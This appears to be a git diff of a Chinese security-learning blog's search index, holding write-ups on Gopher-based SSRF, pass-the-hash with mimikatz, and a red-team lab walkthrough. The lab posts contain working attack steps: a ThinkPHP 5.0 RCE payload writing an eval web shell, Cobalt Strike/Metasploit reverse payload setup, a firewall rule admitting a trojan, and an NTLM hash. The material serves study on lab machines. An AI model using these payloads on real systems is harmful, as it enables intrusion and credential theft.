@@ -1,85 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Gopher协议学习</title>
-    <url>/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h4 id="Gopher协议的学习"><a href="#Gopher协议的学习" class="headerlink" title="Gopher协议的学习"></a>Gopher协议的学习</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；(百度百科)</p>
-<h5 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式:"></a>gopher协议格式:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher协议  URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 可用于构造Http请求包</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444  //kali开启4444端口进行监听 </span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" class="">
-
-<h5 id="通过pikachu靶场演示"><a href="#通过pikachu靶场演示" class="headerlink" title="通过pikachu靶场演示"></a>通过pikachu靶场演示</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.159.132/pikachu/vul/ssrf/ssrf_info/info1.php //看到网站url参数为url=一个url 可能存在ssrf漏洞</span><br></pre></td></tr></table></figure>
-
-<p>我们可以将url后面的参数改为gopheri协议像目标主机发送数据流</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://kaliIP:端口号/这是我发送的数据</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" class="">
-
-<p>可以看到kali这边成功的接收到了我们通过gopher协议传输的数据</p>
-<h5 id="gopher协议发送GET、POST请求"><a href="#gopher协议发送GET、POST请求" class="headerlink" title="gopher协议发送GET、POST请求"></a>gopher协议发送GET、POST请求</h5><h6 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h6><p>步骤</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、构造HTTP数据包</span><br><span class="line">2、URL编码、替换回车换行为%0d%0a</span><br><span class="line">3、发送gopher协议</span><br></pre></td></tr></table></figure>
-
-<p>GET型的HTTP数据包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ssrf/base/get.php?url=test HTTP/1.1</span><br><span class="line">Host: 192.168.159.132</span><br></pre></td></tr></table></figure>
-
-<p>为了方便我们直接在kali中进行演示</p>
-<p>首先进入/var/www/html目录下创建gopher.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www   </span><br><span class="line">vim gopher.php</span><br></pre></td></tr></table></figure>
-
-<p>将php代码写入gopher.php中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot; ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>开启apache</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2 //开启apache</span><br></pre></td></tr></table></figure>
-
-<p>重新打开一个shell</p>
-<p>输入命令 这里注意我们使用的是http数据包,我们每次在浏览器输入的参数等,浏览器都会进行url编码以后才会传输.</p>
-<p>因此我们需要对输入的命令进行url编码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_GET%20/gopher.php%3fname=xiaobai%20HTTP/1.1%0d%0AHost:%20192.168.159.131%0d%0A </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、问号（？）需要转码为URL编码，也就是%3f</span><br><span class="line">2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</span><br><span class="line">3、在HTTP包的最后要加%0d%0a，代表消息结束 //具体http格式可参考之前写的http请求头学习的文章</span><br></pre></td></tr></table></figure>
-
-<p>成功通过get方式发送http数据包</p>
-<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" class="">
-
-<h6 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h6><p>同样的方法先在html目录下创建gopher_post.php文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www</span><br><span class="line">vim gopher_post.php</span><br></pre></td></tr></table></figure>
-
-<p>php代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>post请求包格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /gopher_post.php HTTP/1.1 //请求行</span><br><span class="line">host:192.168.159.131 //请求头 </span><br><span class="line"></span><br><span class="line">name=libo //请求实体 </span><br></pre></td></tr></table></figure>
-
-<p>这里需要提醒一下,get请求包是没有请求实体的参数直接跟在了uri后面,而post请求包参数是放在请求实体的,具体详细信息可以参考我之前的文章HTTP请求头的学习文章有详细介绍.</p>
-<p>url编码后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_POST%20/gopher_post.php%20HTTP/1.1%0d%0AHost:192.168.159.131%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:13%0d%0A%0d%0Aname=xiaobai%0d%0A </span><br></pre></td></tr></table></figure>
-
-<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" class="">
-
-<p>成功通过post方式发送数据包</p>
-<p>注意:POST请求头在原有基础上多增加了Content-Type,Content-Length两个请求头参数.</p>
-<blockquote>
-<p>借鉴文章[Gopher协议在SSRF漏洞中的深入研究(<a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a>)</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络协议学习</category>
-      </categories>
-      <tags>
-        <tag>http协议</tag>
-        <tag>Gopher协议</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SSRF漏洞及相关协议学习</title>
     <url>/2021/12/27/SSRF%E6%BC%8F%E6%B4%9E%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><h5 id="中文意思："><a href="#中文意思：" class="headerlink" title="中文意思："></a>中文意思：</h5><p>本地文件传输协议 </p>
@@ -199,58 +120,82 @@
       </tags>
   </entry>
   <entry>
-    <title>内网渗透</title>
-    <url>/2021/12/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h1><p>在对内网主机进行信息收集后，接下来我们就是要对内网主机发动攻击。</p>
-<h3 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h3><p>在域环境内，只有获得了<strong>域管理员</strong>的哈希才可以攻击。我们得到了域管理员administrator的哈希，在这里我们就可以用哈希传递攻击了。</p>
-<p>在前面获得了域管理员 administrator 的NTLM哈希为：a4ee66cc11243b7741dbb83262e7eba4</p>
-<p>NTLM: 就是NT的哈希值，前面的章节已经介绍过</p>
-<p>哈希传递工具 必须借助<code>mimikatz</code></p>
-<blockquote>
-<p><em>Mimikatz是一款可以抓取系统内的明文密码的工具</em></p>
-</blockquote>
-<p>通过蚁剑上传到 web目录</p>
+    <title>Gopher协议学习</title>
+    <url>/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h4 id="Gopher协议的学习"><a href="#Gopher协议的学习" class="headerlink" title="Gopher协议的学习"></a>Gopher协议的学习</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；(百度百科)</p>
+<h5 id="gopher协议格式"><a href="#gopher协议格式" class="headerlink" title="gopher协议格式:"></a>gopher协议格式:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher协议  URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 可用于构造Http请求包</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<p>在meterpreter中运行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> shell</span><br><span class="line">chcp 65001</span><br><span class="line">cd c:\phpstudy\www</span><br></pre></td></tr></table></figure>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" class="">
 
-<p>运行命令 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug  #提升权限</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444  //kali开启4444端口进行监听 </span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#开始 Pass-The-Hash(hash传递攻击域控服务器  也就是 192.168.52.138）</span><br><span class="line">#格式sekurlsa::pth  /user: 用户名 /domain:域控名 /ntlm: NTLM哈希</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:a4ee66cc11243b7741dbb83262e7eba4</span><br></pre></td></tr></table></figure>
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" class="">
 
-<p>exit 退出</p>
-<p>我们直接远程执行 域控服务器上的命令</p>
-<p>以下所有的命令是在跳板机上执行。</p>
-<p>这里要在中国蚁剑上面执行，在msf里面 会失败</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$       #查看 C盘目录里面的文件  \\就是网络路径   $就是 根目录的意思</span><br><span class="line">或者</span><br><span class="line">dir \\owa\c$</span><br></pre></td></tr></table></figure>
+<h5 id="通过pikachu靶场演示"><a href="#通过pikachu靶场演示" class="headerlink" title="通过pikachu靶场演示"></a>通过pikachu靶场演示</h5><img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" class="">
 
-<p>执行第二台机器上的命令</p>
-<p>还有其他的攻击方式 ，等我们后面讲完漏洞再去学习。</p>
-<h3 id="cobaltstike联动MSF"><a href="#cobaltstike联动MSF" class="headerlink" title="cobaltstike联动MSF"></a>cobaltstike联动MSF</h3><p>首先在CobaltStrike上开启一个监听</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一                                   个，所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.59.134         #cobaltstrike监听的ip   就是服务端的IP</span><br><span class="line">set lport 14444                 #cobaltstrike监听的端口 </span><br><span class="line">set session 1                   #这里是获得的session的id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=http://192.168.159.132/pikachu/vul/ssrf/ssrf_info/info1.php //看到网站url参数为url=一个url 可能存在ssrf漏洞</span><br></pre></td></tr></table></figure>
 
-<p>我们打开cs 可以看到主机已经上线</p>
-<p>鼠标右键 —会话交互</p>
-<p>因为60秒执行一次命令，要等待的时间太长  我们改为2 秒，实战中不能改的太短，太短会引起防火墙或者杀软注意</p>
-<p>在最下面 beacon  输入 sleep2  </p>
-<p>输入 help查看命令</p>
-<p>输入命令 抓取密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入命令 抓取密码</span><br></pre></td></tr></table></figure>
+<p>我们可以将url后面的参数改为gopheri协议像目标主机发送数据流</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.159.132/pikachu/vul/ssrf/ssrf_curl.php?url=gopher://kaliIP:端口号/这是我发送的数据</span><br></pre></td></tr></table></figure>
 
-<p>横向移动：</p>
-<p>鼠标右键 网络探测：</p>
-<p>这里我们新建一个监听器,这个后面要用</p>
-<p>运行完成后要等 几秒</p>
-<p>同样的办法横向移动到域控</p>
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" class="">
+
+<p>可以看到kali这边成功的接收到了我们通过gopher协议传输的数据</p>
+<h5 id="gopher协议发送GET、POST请求"><a href="#gopher协议发送GET、POST请求" class="headerlink" title="gopher协议发送GET、POST请求"></a>gopher协议发送GET、POST请求</h5><h6 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h6><p>步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、构造HTTP数据包</span><br><span class="line">2、URL编码、替换回车换行为%0d%0a</span><br><span class="line">3、发送gopher协议</span><br></pre></td></tr></table></figure>
+
+<p>GET型的HTTP数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ssrf/base/get.php?url=test HTTP/1.1</span><br><span class="line">Host: 192.168.159.132</span><br></pre></td></tr></table></figure>
+
+<p>为了方便我们直接在kali中进行演示</p>
+<p>首先进入/var/www/html目录下创建gopher.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www   </span><br><span class="line">vim gopher.php</span><br></pre></td></tr></table></figure>
+
+<p>将php代码写入gopher.php中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &quot;Hello &quot;.$_GET[&quot;name&quot;].&quot;\n&quot; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>开启apache</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start apache2 //开启apache</span><br></pre></td></tr></table></figure>
+
+<p>重新打开一个shell</p>
+<p>输入命令 这里注意我们使用的是http数据包,我们每次在浏览器输入的参数等,浏览器都会进行url编码以后才会传输.</p>
+<p>因此我们需要对输入的命令进行url编码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_GET%20/gopher.php%3fname=xiaobai%20HTTP/1.1%0d%0AHost:%20192.168.159.131%0d%0A </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、问号（？）需要转码为URL编码，也就是%3f</span><br><span class="line">2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</span><br><span class="line">3、在HTTP包的最后要加%0d%0a，代表消息结束 //具体http格式可参考之前写的http请求头学习的文章</span><br></pre></td></tr></table></figure>
+
+<p>成功通过get方式发送http数据包</p>
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" class="">
+
+<h6 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h6><p>同样的方法先在html目录下创建gopher_post.php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/www</span><br><span class="line">vim gopher_post.php</span><br></pre></td></tr></table></figure>
+
+<p>php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;Hello &quot;.$_POST[&quot;name&quot;].&quot;\n&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>post请求包格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /gopher_post.php HTTP/1.1 //请求行</span><br><span class="line">host:192.168.159.131 //请求头 </span><br><span class="line"></span><br><span class="line">name=libo //请求实体 </span><br></pre></td></tr></table></figure>
+
+<p>这里需要提醒一下,get请求包是没有请求实体的参数直接跟在了uri后面,而post请求包参数是放在请求实体的,具体详细信息可以参考我之前的文章HTTP请求头的学习文章有详细介绍.</p>
+<p>url编码后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.159.131:80/_POST%20/gopher_post.php%20HTTP/1.1%0d%0AHost:192.168.159.131%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:13%0d%0A%0d%0Aname=xiaobai%0d%0A </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/27/gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" class="">
+
+<p>成功通过post方式发送数据包</p>
+<p>注意:POST请求头在原有基础上多增加了Content-Type,Content-Length两个请求头参数.</p>
+<blockquote>
+<p>借鉴文章[Gopher协议在SSRF漏洞中的深入研究(<a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a>)</p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>内网学习</category>
+        <category>网络协议学习</category>
       </categories>
       <tags>
-        <tag>内网</tag>
-        <tag>日志注入</tag>
+        <tag>http协议</tag>
+        <tag>Gopher协议</tag>
       </tags>
   </entry>
   <entry>
@@ -355,6 +300,323 @@
       <tags>
         <tag>session</tag>
         <tag>form表单</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红队靶机五练习</title>
+    <url>/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息:"></a>靶机信息:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机 kali</span><br><span class="line">ip:192.168.0.153</span><br><span class="line">靶机 web服务器</span><br><span class="line">网卡1:192.168.0.162</span><br><span class="line">网卡2:192.168.138.136</span><br><span class="line">靶机:域控</span><br><span class="line">ip:192.168.138.138</span><br></pre></td></tr></table></figure>
+
+<h4 id="相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因"><a href="#相对于红队靶机一感觉简单了许多-可能是套路一样做了一遍的原因" class="headerlink" title="相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因"></a>相对于红队靶机一感觉简单了许多,可能是套路一样做了一遍的原因</h4><h5 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.0.0/24  //探测存活主机</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/1.png" class="">
+
+<p>192.168.0.162便是我们把靶机ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -sT 192.168.0.162 //对目标靶机进行端口扫描查看开启的服务</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 21:31 CST</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.0.162</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line">Not shown: 992 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B9:F4:45 (VMware)</span><br><span class="line">Device type: general purpose|media device</span><br><span class="line">Running: Microsoft Windows 2008|10|7|8.1, Microsoft embedded</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_10 cpe:/h:microsoft:xbox_one cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows Server 2008 SP2, Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One, Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: WIN7, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b9:f4:45 (VMware)</span><br><span class="line">|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: -1s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: win7</span><br><span class="line">|   NetBIOS computer name: WIN7\x00</span><br><span class="line">|   Domain name: sun.com</span><br><span class="line">|   Forest name: sun.com</span><br><span class="line">|   FQDN: win7.sun.com</span><br><span class="line">|_  System time: 2021-12-27T21:32:33+08:00</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-12-27T13:32:33</span><br><span class="line">|_  start_date: 2021-12-24T10:19:01</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   9.84 ms 192.168.0.162</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>3306一般是mysql数据库对应的服务端口</p>
+<p>尝试远程连接一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h192.168.0.162 -uroot -p </span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/2.png" class="">
+
+<p>但是目标靶机数据库貌似禁用了远程连接</p>
+<p>上面看到目标靶机还开放了80端口http服务,通过浏览器访问一下.</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/3.png" class="">
+
+<p>是一个thinkphp框架,通过报错查看对应的版本.</p>
+<p>发现是<a href="http://www.thinkphp.cn/">ThinkPHP</a> V5.0.22</p>
+<p>网上有很多poc随便找一个尝试利用  ThinkPhp5.0任意代码执行：<a href="https://www.cnblogs.com/backlion/p/10106676.html">https://www.cnblogs.com/backlion/p/10106676.html</a></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ttp://192.168.0.162/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo ^&lt;?php @eval($_GET[&quot;xiaobao&quot;]);?^&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>通过蚁剑尝试连接</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/4.png" class="">
+
+<p>连接成功</p>
+<p>通过蚁剑的虚拟终端查看当前权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/5.png" class="">
+
+<p>直接是管理员权限.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all 查看是否有域</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/7.png" class="">
+
+<p>发现存在名字为sun的域</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist //查看是否有杀毒软件</span><br></pre></td></tr></table></figure>
+
+<p>发现并没有杀毒软件</p>
+<p>这里准备cs生成一个木马把靶机上线到cs进行后渗透</p>
+<h5 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver 192.168.0.153 123456 //开启cs服务器</span><br></pre></td></tr></table></figure>
+
+<p>客户端进行连接</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/8.png" class="">
+
+<p>开启一个监听并生成木马muma.exe</p>
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/9.png" class="">
+
+<p>通过蚁剑上传到靶机对应的目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;muma.exe&quot; dir=in action=allow program=&quot;C:\phpStudy\WWW\muma.exe&quot; enable=yes //设置防火墙默认允许</span><br></pre></td></tr></table></figure>
+
+<p>运行木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">muma.exe</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/10.png" class="">
+
+<p>上线成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell net time /domain //查看域控</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/11.png" class="">
+
+<p>通过ping域控名字查看其IP地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell ping DC.sun.com</span><br><span class="line">[*] Tasked beacon to run: ping DC.sun.com</span><br><span class="line">[+] host called home, sent: 106 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">正在 Ping DC.sun.com [192.168.138.138] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; net view //查看域内主机</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/12/28/%E7%BA%A2%E9%98%9F%E9%9D%B6%E6%9C%BA%E4%BA%94%E7%BB%83%E4%B9%A0/12.png" class="">
+
